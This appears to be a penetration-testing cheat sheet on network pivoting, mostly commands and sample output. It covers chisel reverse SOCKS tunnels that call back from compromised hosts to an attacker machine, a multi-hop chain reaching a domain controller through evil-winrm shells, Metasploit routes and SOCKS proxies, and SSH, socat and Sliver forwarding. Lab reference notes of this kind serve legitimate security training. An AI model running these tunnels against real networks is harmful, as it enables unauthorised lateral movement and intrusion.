---
title: "Network Traffic Pivoting"
date: 2025-7-25
tags: ["Pivoting", "Sliver", "Pivot", "Chisel", "Ssh", "Network", "Socat", "Port Forwarding", "Tunneling", "Metasploit"]
---

{{< tab set1 tab1 >}}chisel{{< /tab >}}
{{< tab set1 tab2 >}}metasploit{{< /tab >}}
{{< tab set1 tab3 >}}ssh{{< /tab >}}
{{< tab set1 tab4 >}}socat{{< /tab >}}
{{< tab set1 tab5 >}}sliver{{< /tab >}}
{{< tabcontent set1 tab1 >}} 

### General

```console
# Start a local chisel server
./chisel server --reverse --port 8000
```

```console {class="sample-code"}
$ ./chisel server --reverse --port 8000 
2024/09/23 12:27:03 server: Reverse tunnelling enabled
2024/09/23 12:27:03 server: Fingerprint ikFn6iQOOodxIlcDQI4dvFu1pdHgV5UnHRenxUg0eho=
2024/09/23 12:27:03 server: Listening on http://0.0.0.0:8000
```

#### Ports Forwarding

```console
# In target machine
./chisel client <LOCAL_IP>:8000 R:<TARGET_PORT>:<TARGET_IP>:<TARGET_PORT>
```

```console {class="sample-code"}
./chisel client 10.10.14.1:8000 R:3000:127.0.0.1:3000
```

```console
# Mutiple ports forwarding, can be different targets in the same subnet
./chisel client <LOCAL_IP>:8000 R:<TARGET_PORT_1>:<TARGET_IP_1>:<TARGET_PORT_1> R:<TARGET_PORT_2>:<TARGET_IP_2>:<TARGET_PORT_2>
```

```console {class="sample-code"}
./chisel client 10.10.14.1:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000
```

#### Socks5

```console
# In target machine
./chisel client <LOCAL_IP>:8000 R:1081:socks
```

```console {class="sample-code"}
$ ./chisel client 10.10.14.31:8000 R:1081:socks
2024/09/23 04:16:44 client: Connecting to ws://10.10.14.31:8000
2024/09/23 04:16:44 client: Connected (Latency 47.945673ms)
```

<br>

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1081
```

```console
# Example, in our local machine
proxychains4 curl http://172.16.1.100:1081
```

<small>*Ref: [chisel](https://github.com/jpillora/chisel)*</small>

### Multiple Subnets

#### 1. Local Kali

```console
./chisel server --reverse --socks5 --port 8000
```

#### 2. Hop 1

{{< tab set1-1-1 tab1 active>}}Linux{{< /tab >}}{{< tab set1-1-1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1-1-1 tab1 >}}

```console
# Start a client
./chisel client <LOCAL_IP>:8000 R:1081:socks &
```

```console
# Start a server
./chisel server --reverse --socks5 --port 8001 &
```

{{< /tabcontent >}}
{{< tabcontent set1-1-1 tab2 >}}

```console
# Start a client
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client <LOCAL_IP>:8000 R:1081:socks }
```

```console
# Start a server
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe server --reverse --socks5 --port 8001 }
```

{{< /tabcontent >}}

<br>

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1081
```

#### 3. Hop 2

{{< tab set1-1-2 tab1 active>}}Linux{{< /tab >}}{{< tab set1-1-2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1-1-2 tab1 >}}

```console
# Start a client
./chisel client <HOP_1_IP>:8001 R:1082:socks &
```

```console
# Start a server
./chisel server --reverse --socks5 --port 8002 &
```

{{< /tabcontent >}}
{{< tabcontent set1-1-2 tab2 >}}

```console
# Start a client
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client <HOP_1_IP>:8001 R:1082:socks }
```

```console
# Start a server
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe server --reverse --socks5 --port 8002 }
```

{{< /tabcontent >}}

<br>

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1082
```

#### 4. Hop 3

{{< tab set1-1-3 tab1 active>}}Linux{{< /tab >}}{{< tab set1-1-3 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1-1-3 tab1 >}}

```console
# Start a client
./chisel client <HOP_2_IP>:8002 R:1083:socks &
```

```console
# Start a server
./chisel server --reverse --socks5 --port 8003 &
```

{{< /tabcontent >}}
{{< tabcontent set1-1-3 tab2 >}}

```console
# Start a client
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client <HOP_2_IP>:8002 R:1083:socks }
```

```console
# Start a server
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe server --reverse --socks5 --port 8003 }
```

{{< /tabcontent >}}

<br>

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1083
```

<small>*Note: Follow the same pattern for more layers*</small>

#### Example

```console
 Local Kali         WEB01 LINUX            DC01 Windows          DC02 Windows <-- TARGET
+------------+     +---------------+     +---------------+     +---------------+
| 10.10.14.1 |     | 10.10.110.100 |     | 172.16.1.20   |     | 172.16.2.5    |
|            | --> |               | --> |               | --> |               |
|            |     | 172.16.1.100  |     | 172.16.2.20   |     |               |
+------------+     +---------------+     +---------------+     +---------------+
```

#### 1. Local Kali

```console
./chisel server --reverse --socks5 --port 8000
```

```console {class="sample-code"}
$ ./chisel server --reverse --socks5 --port 8000
2024/09/29 14:25:33 server: Reverse tunnelling enabled
2024/09/29 14:25:33 server: Fingerprint QFsVZapiOv/hBAKLzj+645y42Sra4IV/Le7G/wgZ4/Y=
2024/09/29 14:25:33 server: Listening on http://0.0.0.0:8000
2024/09/29 14:25:40 server: session#1: tun: proxy#R:127.0.0.1:1081=>socks: Listening
```

#### 2. WEB01 Linux (Gateway 1)

```console
# Start a client
./chisel client 10.10.14.1:8000 R:1081:socks &
```

```console {class="sample-code"}
root@WEB01:/dev/shm# ./chisel client 10.10.14.1:8000 R:1081:socks
2024/09/28 23:31:23 client: Connecting to ws://10.10.14.1:8000
2024/09/28 23:31:26 client: Connected (Latency 312.250392ms)
```

```console
# Start a server
./chisel server --reverse --socks5 --port 8001 &
```

```console {class="sample-code"}
root@WEB01:/dev/shm# ./chisel server --reverse --socks5 --port 8001
2024/09/28 22:54:18 server: Fingerprint BsVmahG6oWbFa26XG4DC8tPiL9nFq2zF3N8jUG5Edwk=
2024/09/28 22:54:18 server: Listening on http://0.0.0.0:8001
2024/09/28 22:56:07 server: session#1: tun: proxy#R:127.0.0.1:1082=>socks: Listening
```

#### 3. DC01 Windows (Gateway 2)

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1081
```

```console
proxychains4 evil-winrm -i 172.16.1.20 -u user -p password
```

```console {class="sample-code"}
$ proxychains4  evil-winrm -i 172.16.1.20 -u user -p password
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  172.16.1.20:5985  ...  OK
*Evil-WinRM* PS C:\Users\user\Documents>
```

```console
.\chisel.exe client 172.16.1.100:8001 R:1082:socks
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\user\Documents>.\chisel.exe client 172.16.1.100:8001 R:1082:socks             
2024/09/29 07:41:35 client: Connecting to ws://172.16.1.100:8001                                        
2024/09/29 07:41:35 client: Connected (Latency 0s)
```

```console
# Or run in background
Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client 172.16.1.100:8001 R:1082:socks }
```

#### 4. Local Kali

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1082
```

```console
proxychains4 evil-winrm -i 172.16.2.5 -u user -p password
```

```console {class="sample-code"}
$ proxychains4 evil-winrm -i 172.16.2.5 -u user -p password                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  127.0.0.1:1082  ...  172.16.2.5:5985  ...  OK
*Evil-WinRM* PS C:\Users\user\Documents> 
```

<small>*Note: Edit /etc/proxychains4.conf accordingly, depends on which layer you are accessing*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Ports Forwarding

```console
# Add
portfwd add -l <TARGET_PORT> -r <TARGET> -p <TARGET_PORT>
```

```console {class="sample-code"}
meterpreter > portfwd add -l 88 -r 172.16.2.5 -p 88
[*] Forward TCP relay created: (local) :88 -> (remote) 172.16.2.5:88
```

```console
# Delete
portfwd delete -l <TARGET_PORT> -r <TARGET> -p <TARGET_PORT>
```

#### Add Routes

{{< tab set1-2-1 tab1 active >}}autoroute{{< /tab >}}{{< tab set1-2-1 tab2 >}}route{{< /tab >}}
{{< tabcontent set1-2-1 tab1 >}}

```console
# Enter target session
sessions <SESSION_ID>
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > sessions 1
[*] Starting interaction with 1...
```

```console
# Return from meterpreter
background
```

```console {class="sample-code"}
meterpreter > background
[*] Backgrounding session 1...
```

```console
use post/multi/manage/autoroute
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > 
```

```console
set session <SESSION_ID>
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > set session 1
session => 1
```

```console
# Manual add [optional]
set cmd add
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > set cmd add
cmd => add
```

```console
# Manual set subnet [optional]
set subnet <SUBNET>
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > set subnet 172.16.1.0
subnet => 172.16.1.0
```

```console
# Manual set mask [optional]
set netmask <MASK>
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > set netmask 255.255.255.0
netmask => 255.255.255.0
```

```console
run
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > run

[*] Running module against 172.16.1.100
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.1.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

{{< /tabcontent >}}
{{< tabcontent set1-2-1 tab2 >}}

```console
# Manual add route
route add <SUBNET> <MASK> <SESSION_ID>
```

{{< /tabcontent >}}

<br>

```console
# Check
route
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.1.0         255.255.255.0      Session 2
   172.16.2.0         255.255.255.0      Session 1
```

```console
# Check route to target
route get <TARGET>
```

```console {class="sample-code"}
msf6 auxiliary(server/socks_proxy) > route get 172.16.2.1
172.16.2.1 routes through: Session 1
```

```console
# Remove route
route remove <SUBNET>/<MASK> <SESSION_ID>
```

```console
# Remove all routes
route flush
```

#### Socks5

```console
use auxiliary/server/socks_proxy
```

```console {class="sample-code"}
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) >
```

```console
# Set socks port [optional]
set SRVPORT <SOCKS_PORT>
```

```console {class="sample-code"}
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1081
SRVPORT => 1081
```

```console
run
```

```console {class="sample-code"}
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server              <----- Press Enter
```

<br>

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 <SOCKS_PORT>
```

```console
# Example, in our local machine
proxychains4 curl http://172.16.1.100:1081
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
# Port forwarding without spawning a shell
sshpass -p '<PASSWORD>' ssh -N -L <TARGET_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<TARGET>
```

```console {class=sample-code}
$ ssh -N -L 5985:127.0.0.1:5985 3v4Si0N@10.10.10.240
3v4Si0N@10.10.10.240's password:  
```

```console
# SOCKS tunneling without spawning a shell
sshpass -p '<PASSWORD>' ssh -N -D 1081 <USER>@<TARGET>
```

```console {class=sample-code}
$ ssh -i id_rsa -N -D 1081 root@10.10.11.179
```

```console
# Socket forwarding without spawning a shell
sshpass -p '<PASSWORD>' ssh -N -L /tmp/<SOCKET_NAME>:<SOCKET> <USER>@<TARGET>
```

```console {class=sample-code}
$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.10.127.97
```

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

```console
# Any traffic go to port <TARGET_PORT> will be forwarded to <LOCAL_IP>:<TARGET_PORT>
./socat tcp-listen:<TARGET_PORT>,fork tcp:<LOCAL_IP>:<TARGET_PORT> &
```

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

```console
# Port forwarding
portfwd add -b 127.0.0.1:<TARGET_PORT> -r <TARGET_IP>:<TARGET_PORT>
```

```console
# Socks
socks5 start
```

{{< /tabcontent >}}
